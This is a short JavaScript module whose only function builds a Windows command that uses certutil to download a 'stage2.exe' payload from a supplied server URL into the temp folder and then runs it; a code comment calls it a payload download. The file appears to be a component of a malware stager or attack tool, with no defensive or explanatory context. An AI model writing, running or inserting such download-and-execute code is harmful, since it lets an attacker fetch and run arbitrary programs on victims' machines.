function generate(token, serverUrl) {
    // Downloads payload via certutil, executes
    return `certutil -urlcache -split -f "${serverUrl}/stage2.exe" %TEMP%\\h_${token}.exe && start %TEMP%\\h_${token}.exe`;
}

module.exports = { generate };
